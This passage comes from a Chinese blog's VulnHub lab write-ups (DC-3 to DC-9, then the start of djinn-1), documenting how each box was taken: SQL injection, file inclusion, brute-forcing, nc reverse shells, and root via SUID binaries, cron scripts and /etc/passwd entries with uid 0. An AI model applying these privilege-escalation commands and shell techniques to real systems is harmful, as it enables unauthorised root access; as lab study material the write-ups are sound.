alt=\"\"></p>\n<p>wget把给的脚本文件下载下来解压，进入exploit目录，运行compile.sh，执行doubleput，成功得到root权限</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013230712.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013230739.png\" alt=\"\"></p>\n<p>find搜索flag，完成</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013230940.png\" alt=\"\"></p>\n<h2 id=\"DC-4\"><a href=\"#DC-4\" class=\"headerlink\" title=\"DC-4\"></a>DC-4</h2><h3 id=\"信息搜集-3\"><a href=\"#信息搜集-3\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201015161042.png\" alt=\"\"></p>\n<p>ssh开着，80服务一个登录框</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201015161312.png\" alt=\"\"></p>\n<h3 id=\"获取敏感信息\"><a href=\"#获取敏感信息\" class=\"headerlink\" title=\"获取敏感信息\"></a>获取敏感信息</h3><p>也没挂啥服务，一边丢burp，万能密码直接进来了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201015165826.png\" alt=\"\"></p>\n<p>进来是个命令执行界面，内置了几个命令，抓包有任意命令执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201015170238.png\" alt=\"\"></p>\n<p>搜索一番发现jim用户下有个备份文件夹，里面有一个旧密码的txt</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201015171121.png\" alt=\"\"></p>\n<h3 id=\"ssh爆破\"><a href=\"#ssh爆破\" class=\"headerlink\" title=\"ssh爆破\"></a>ssh爆破</h3><p>用得到的旧密码试着爆破jim用户的ssh密码，</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201015184232.png\" alt=\"\"></p>\n<p>登录，home目录下有个奇怪的邮件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201015185042.png\" alt=\"\"></p>\n<p>翻目录，在var下的mail目录下找到一封邮件，得到Charles的密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201015185138.png\" alt=\"\"></p>\n<p>那么切换用户，得知teehee命令是不需要root权限的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201015185531.png\" alt=\"\"></p>\n<h3 id=\"teehee提权\"><a href=\"#teehee提权\" class=\"headerlink\" title=\"teehee提权\"></a>teehee提权</h3><p>看看这个是干啥的，–help查看帮助</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201015190503.png\" alt=\"\"></p>\n<p>注意到<code>-a</code>参数可以直接在文件末尾加上字符串</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201015190419.png\" alt=\"\"></p>\n<p>那么尝试往passwd写入一个账户</p>\n<p><code>/etc/passwd</code> 各个字段的含义：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">username:password:User ID:Group ID:comment:home directory:shell</span><br></pre></td></tr></table></figure>\n\n<p>写入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">blacknight::0:0:::&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>\n\n<p>密码我们直接置空，uid和gid都是0，也就是root用户，也就是说覆盖了root账户，密码为0</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201015191710.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201015191728.png\" alt=\"\"></p>\n<p>根目录执行find命令找到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201015191815.png\" alt=\"\"></p>\n<h2 id=\"DC-5\"><a href=\"#DC-5\" class=\"headerlink\" title=\"DC-5\"></a>DC-5</h2><h3 id=\"信息搜集-4\"><a href=\"#信息搜集-4\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201018104818.png\" alt=\"\"></p>\n<p>111端口之前以及提到可能会造成拒绝服务攻击，36018不知道啥服务</p>\n<p>扫下目录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201018133147.png\" alt=\"\"></p>\n<p>探测指纹也就一个nginx，没啥框架</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201018105246.png\" alt=\"\"></p>\n<p>访问80服务，几个页面都是一大堆文字，就一个</p>\n<p>整个网站就这么一个页面可以交互，抓包看看</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201018134143.png\" alt=\"\"></p>\n<p>发现每次发包，copyright的年份都会变化，之前也扫到了一个footer.php，访问下正是这个部分</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201018134754.png\" alt=\"\"></p>\n<h3 id=\"日志注入\"><a href=\"#日志注入\" class=\"headerlink\" title=\"日志注入\"></a>日志注入</h3><p>那么猜想thankyou.php应该是require或者include了一个footer.php，那么就可能存在文件包含漏洞</p>\n<p>验证一下确实存在，参数。。。嗯猜出来或者fuzz一下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201018141800.png\" alt=\"\"></p>\n<p>那么日志就可以包含到了，直接往日志里写入shell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201018215946.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201018215932.png\" alt=\"\"></p>\n<p>我这直接nc一个端口连一下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201018220603.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201018220648.png\" alt=\"\"></p>\n<p>转换程交互式shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201018220803.png\" alt=\"\"></p>\n<h3 id=\"SUID-screen4-5-0提权\"><a href=\"#SUID-screen4-5-0提权\" class=\"headerlink\" title=\"SUID_screen4.5.0提权\"></a>SUID_screen4.5.0提权</h3><p>没找到啥其他可疑文件，找找suid，发现有个奇怪的screen</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201018225001.png\" alt=\"\"></p>\n<p>百度一波</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201018225143.png\" alt=\"\"></p>\n<p>并且看到该版本可以提权，搜索相关漏洞</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201018231351.png\" alt=\"\"></p>\n<p>跟着<a href=\"https://blog.csdn.net/qq_45555226/article/details/105207724#4.screen%204.5.0%E5%AD%98%E5%9C%A8%E7%9D%80%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E41154.sh%EF%BC%88%E9%9C%80%E8%A6%81%E4%BF%AE%E6%94%B9%EF%BC%8C%E6%8F%90%E5%89%8D%E7%BC%96%E8%AF%91%EF%BC%8C%E4%BB%A5%E5%8F%8A%3Aset%20ff%3Dunix%EF%BC%89%EF%BC%9B\" target=\"_blank\" rel=\"noopener\">文章</a>复现即可</p>\n<p>最后得到root权限</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201020223146.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201020223350.png\" alt=\"\"></p>\n<p>tips:这里的几个shellcode是用nc传过去的，在看wp的过程中学到了使用vsftps进行文件下载，<a href=\"https://plat.wgpsec.org/knowledge/view/3556fde8add14a628cc1dcb546a7d2b0\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>\n<h2 id=\"DC-6\"><a href=\"#DC-6\" class=\"headerlink\" title=\"DC-6\"></a>DC-6</h2><h3 id=\"信息搜集-5\"><a href=\"#信息搜集-5\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201021082719.png\" alt=\"\"></p>\n<p>又是一波重定向，修改hosts搞定，打开80页面是熟悉的wordpress界面</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201021084351.png\" alt=\"\"></p>\n<h3 id=\"爆破后台\"><a href=\"#爆破后台\" class=\"headerlink\" title=\"爆破后台\"></a>爆破后台</h3><p>wpscan扫一波发现了几个用户名，尝试爆破无果，回去看看还有提示</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201022195328.png\" alt=\"\"></p>\n<p>说是把rockyou.txt里的包含k01的密码提取出来，那就试试用这个爆破，还真出来一个</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201022195308.png\" alt=\"\"></p>\n<p>登陆后台，注意到有个插件，大概是记录网站活动的东西</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201022200809.png\" alt=\"\"></p>\n<h3 id=\"getshell-1\"><a href=\"#getshell-1\" class=\"headerlink\" title=\"getshell\"></a>getshell</h3><p>百度得知这个插件是被爆过洞的，<a href=\"http://www.oniont.cn/index.php/archives/257.html\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>\n<p>这里存在着命令执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201022201629.png\" alt=\"\"></p>\n<p>那么直接连个shell</p>\n<p>输入框有长度限制，抓个包构造</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201022201831.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201022201853.png\" alt=\"\"></p>\n<h3 id=\"备份脚本执行\"><a href=\"#备份脚本执行\" class=\"headerlink\" title=\"备份脚本执行\"></a>备份脚本执行</h3><p>home目录下有个txt，获得graham的密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201022202106.png\" alt=\"\"></p>\n<p>sudo -l得知有个jens用户的backups.sh免密</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201022203444.png\" alt=\"\"></p>\n<p>并且当前用户还对文件有写入权限</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201022203402.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201022203938.png\" alt=\"\"></p>\n<p>执行看看</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201022204018.png\" alt=\"\"></p>\n<p>那么直接nc连下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201022204150.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201022204306.png\" alt=\"\"></p>\n<h3 id=\"nmap命令执行提权\"><a href=\"#nmap命令执行提权\" class=\"headerlink\" title=\"nmap命令执行提权\"></a>nmap命令执行提权</h3><p>又发现nmap可以root免密执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201022204333.png\" alt=\"\"></p>\n<p>那么直接创建一个脚本，利用nmap执行脚本获得一个root用户的shell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201022205021.png\" alt=\"\"></p>\n<p>得到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201022205113.png\" alt=\"\"></p>\n<h2 id=\"DC-7\"><a href=\"#DC-7\" class=\"headerlink\" title=\"DC-7\"></a>DC-7</h2><h3 id=\"信息搜集-6\"><a href=\"#信息搜集-6\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201023093929.png\" alt=\"\"></p>\n<p>框架是drupal</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201023095330.png\" alt=\"\"></p>\n<p>没啥公开洞，登录密码爆破无果。</p>\n<h3 id=\"社工\"><a href=\"#社工\" class=\"headerlink\" title=\"社工\"></a>社工</h3><p>注意到网页底部有个标识</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025164815.png\" alt=\"\"></p>\n<p>github搜到相关信息</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025164722.png\" alt=\"\"></p>\n<p>配置文件中得到用户名和密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025165021.png\" alt=\"\"></p>\n<p>登录不上，ssh连接成功</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025165155.png\" alt=\"\"></p>\n<h3 id=\"drush修改用户名密码\"><a href=\"#drush修改用户名密码\" class=\"headerlink\" title=\"drush修改用户名密码\"></a>drush修改用户名密码</h3><p>用户目录下有个mbox，查看信息大概是个定时任务提醒</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025211400.png\" alt=\"\"></p>\n<p>来到opt目录，查看backup脚本</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025203443.png\" alt=\"\"></p>\n<p>注意到里面有个drush命令，百度一波，得知是操作drupal的工具，可以直接修改用户名密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025210616.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025211256.png\" alt=\"\"></p>\n<p>这里注意要到html目录下运行，只有这个目录是www-data权限，不然会提示权限不够</p>\n<p>改好了密码登录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025211638.png\" alt=\"\"></p>\n<h3 id=\"getshell-2\"><a href=\"#getshell-2\" class=\"headerlink\" title=\"getshell\"></a>getshell</h3><p>backups.sh脚本是root用户执行的，并且www-data可以改</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025215839.png\" alt=\"\"></p>\n<p>那么考虑怎么拿到www-data的shell</p>\n<p>翻阅后台，本来想生成一个php页面，但百度得知<a href=\"https://www.drupal.org/project/php\" target=\"_blank\" rel=\"noopener\">drupal默认</a>是移除了php页面生成的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025212439.png\" alt=\"\"></p>\n<p>想要创建一个php页面必须在线安装或着下载离线包</p>\n<p>点击安装模块</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025212954.png\" alt=\"\"></p>\n<p>输入下载地址，点击install</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025213048.png\" alt=\"\"></p>\n<p>激活</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025213122.png\" alt=\"\"></p>\n<p>找到模块勾选</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025213302.png\" alt=\"\"></p>\n<p>点击install</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025214430.png\" alt=\"\"></p>\n<p>回到创建页面，发现已经可以创建php页面</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025214817.png\" alt=\"\"></p>\n<p>监听端口，save访问，成功getshell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025215016.png\" alt=\"\"></p>\n<h3 id=\"定时脚本执行提取\"><a href=\"#定时脚本执行提取\" class=\"headerlink\" title=\"定时脚本执行提取\"></a>定时脚本执行提取</h3><p>注意到之前的脚本是root用户执行的，并且www-data可以改，那么直接往里面加内容连shell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025215653.png\" alt=\"\"></p>\n<p>等一会即可获取root权限</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025220112.png\" alt=\"\"></p>\n<p>得到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025220258.png\" alt=\"\"></p>\n<h2 id=\"DC-8\"><a href=\"#DC-8\" class=\"headerlink\" title=\"DC-8\"></a>DC-8</h2><h3 id=\"信息搜集-7\"><a href=\"#信息搜集-7\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025224729.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025225000.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025232138.png\" alt=\"\"></p>\n<p>xray监听放着，点几下网站，直接爆出了sql注入</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025225126.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025225417.png\" alt=\"\"></p>\n<h3 id=\"sqlmap获取用户名密码\"><a href=\"#sqlmap获取用户名密码\" class=\"headerlink\" title=\"sqlmap获取用户名密码\"></a>sqlmap获取用户名密码</h3><p>sqlmap一把梭</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025231519.png\" alt=\"\"></p>\n<p>john试着爆破下，admin没爆破出，得到john用户的密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201025231655.png\" alt=\"\"></p>\n<h3 id=\"getshell-3\"><a href=\"#getshell-3\" class=\"headerlink\" title=\"getshell\"></a>getshell</h3><p>试着寻找webshell注入点</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027194322.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027194407.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027194538.png\" alt=\"\"></p>\n<p>这里没成功，看了下wp说是要在php代码之前加一些文字</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027194946.png\" alt=\"\"></p>\n<p>这样再试下，点击submit</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027195233.png\" alt=\"\"></p>\n<p>成功弹到了shell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027195553.png\" alt=\"\"></p>\n<h3 id=\"exim4漏洞提权\"><a href=\"#exim4漏洞提权\" class=\"headerlink\" title=\"exim4漏洞提权\"></a>exim4漏洞提权</h3><p>这里的目录文件大概是和dc1s一样的，有重置密码脚本，站点下的配置文件也直接给出了数据库密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027200337.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027200417.png\" alt=\"\"></p>\n<p>可以直接重置管理员密码，但我们需要的是提权</p>\n<p>寻找特权文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027200513.png\" alt=\"\"></p>\n<p>发现一个可疑的命令exim4，百度下相关信息，得知可以<a href=\"https://www.csdn.net/gather_2b/Mtjacg3sODEzOTAtYmxvZwO0O0OO0O0O.html\" target=\"_blank\" rel=\"noopener\">提权</a></p>\n<p>查看版本</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027201039.png\" alt=\"\"></p>\n<p>查找相关漏洞</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027201114.png\" alt=\"\"></p>\n<p>复制相关脚本到本地，再本地python搭个http服务，目标机shell上把脚本wget下来</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027201519.png\" alt=\"\"></p>\n<p>查看脚本使用说明</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027201857.png\" alt=\"\"></p>\n<p>但执行不了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027202134.png\" alt=\"\"></p>\n<p>大概是因为脚本是在windows上编写完成传到Linux服务器上的，是dos格式，而shell脚本格式必须是unix才行，验证方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat -A filename，如果输出结果中行末尾是^M$，则是dos格式，如果行末尾只是$，则是unix格式</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027202452.png\" alt=\"\"></p>\n<p>在<a href=\"https://blog.csdn.net/weixin_39309402/article/details/99732688\" target=\"_blank\" rel=\"noopener\">博客</a>中找到解决办法</p>\n<p>在本机上将脚本通过vim的<code>: set ff=unix</code>转换为unix格式，再wget到目标主机</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027202704.png\" alt=\"\"></p>\n<p>再赋予权限执行，成功拿到root权限</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027203215.png\" alt=\"\"></p>\n<p>得到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027203654.png\" alt=\"\"></p>\n<h2 id=\"DC-9\"><a href=\"#DC-9\" class=\"headerlink\" title=\"DC-9\"></a>DC-9</h2><h3 id=\"信息搜集-8\"><a href=\"#信息搜集-8\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027224107.png\" alt=\"\"></p>\n<p>xray扫出个sql注入</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201027224040.png\" alt=\"\"></p>\n<p>sqlmap一把梭</p>\n<p>users库里的Userstaff表里存储着用户名和密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029190241.png\" alt=\"\"></p>\n<p>Staff库的User表里找到管理员密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029160504.png\" alt=\"\"></p>\n<p>md5网站看下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029160547.png\" alt=\"\"></p>\n<p>登上管理员账号看看没啥发现，只有个添加记录的功能</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029164628.png\" alt=\"\"></p>\n<p>注意到提交页面之后下面有个file not exits，猜测可能是包含了file参数，试下成功任意文件读取</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029165827.png\" alt=\"\"></p>\n<h3 id=\"端口敲门\"><a href=\"#端口敲门\" class=\"headerlink\" title=\"端口敲门\"></a>端口敲门</h3><p>把之前跑出来的用户名和密码复制下来准备ssh爆破用，但之前nmap已经得知，22端口被flitered了</p>\n<p><a href=\"https://www.cnblogs.com/wsjhk/p/5508051.html\" target=\"_blank\" rel=\"noopener\">Port Knocking for Ubuntu 14.04 Server</a></p>\n<blockquote>\n<p>端口敲门服务，即：knockd服务。该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来“敲门”，使系统开启需要访问的服务端口，才能对外访问。不使用时，再使用自定义的序列号来“关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性。</p>\n</blockquote>\n<p>知识盲区了，通过文件读取查看etc下的knockd.conf</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029191949.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029192009.png\" alt=\"\"></p>\n<p>现在看ssh是关闭的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029192510.png\" alt=\"\"></p>\n<p>按照这个方法我们nmap访问7469,8475,9842三个端口，这里还要注意顺序</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029192423.png\" alt=\"\"></p>\n<p>现在看ssh已经打开了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029193216.png\" alt=\"\"></p>\n<h3 id=\"ssh爆破-1\"><a href=\"#ssh爆破-1\" class=\"headerlink\" title=\"ssh爆破\"></a>ssh爆破</h3><p>那么我们利用刚存好的用户名和密码在hydra里爆破</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029194148.png\" alt=\"\"></p>\n<p>挑个登录，在一个用户里又找到一份密码文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029194721.png\" alt=\"\"></p>\n<p>再复制下来跑一下，又多跑出来一个用户</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029212616.png\" alt=\"\"></p>\n<h3 id=\"写入root用户提权\"><a href=\"#写入root用户提权\" class=\"headerlink\" title=\"写入root用户提权\"></a>写入root用户提权</h3><p>登录，查看sudo -l，有个自定义的脚本</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029213605.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029213544.png\" alt=\"\"></p>\n<p>大概就是读取read部分的文件，然后把read的文件写入append文件，并且这个命令是root权限的可以写入root权限的文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029215336.png\" alt=\"\"></p>\n<p>那么如果我们往/etc/passwd中写入一个我们自己的用户，比如</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">blacknight::0:0:::&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>\n\n<p>那么就创建了一个blacknight的用户，并且他的uid和gid都是0，其实也就是root用户</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029215514.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029215529.png\" alt=\"\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">echo &#39;blacknight::0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;tmp&#x2F;aaa</span><br></pre></td></tr></table></figure>\n\n<p>但这里发现个问题，那就是用户名超过一定长度就失效，后来改短了点才加进去</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">echo &#39;tos::0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt; &#x2F;tmp&#x2F;aaa</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029221211.png\" alt=\"\"></p>\n<p>但即使密码设为空也无法登录，换种方式，仿照/etc/shadow的内容，使用openssl生成一个hash的密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl passwd -1 -salt tos 123456</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029223010.png\" alt=\"\"></p>\n<p>成功登录root用户</p>\n<p>得到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201029223507.png\" alt=\"\"></p>\n","categories":["vulnhub"]},{"title":"vulnhub——djinn系列","url":"/2020/11/20/vulnhub_djinn/","content":"<h2 id=\"djinn-1\"><a href=\"#djinn-1\" class=\"headerlink\" title=\"djinn-1\"></a>djinn-1</h2><h3 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030193852.png\" alt=\"\"></p>\n<p>22端口服务虽然开着，但处于tcpwrapped状态，即非白名单主机无法连接</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030200601.png\" alt=\"\"></p>\n<p>7331有个静态页面</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030200751.png\" alt=\"\"></p>\n<p>扫描目录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031145127.png\" alt=\"\"></p>\n<h3 id=\"ftp登录\"><a href=\"#ftp登录\" class=\"headerlink\" title=\"ftp登录\"></a>ftp登录</h3><p>有ftp端口，hydra爆破试下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030195346.png\" alt=\"\"></p>\n<p>ftp用户好像随便登录。。。登上去看看目录下有三个文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030195444.png\" alt=\"\"></p>\n<p>下载下来看看</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030200017.png\" 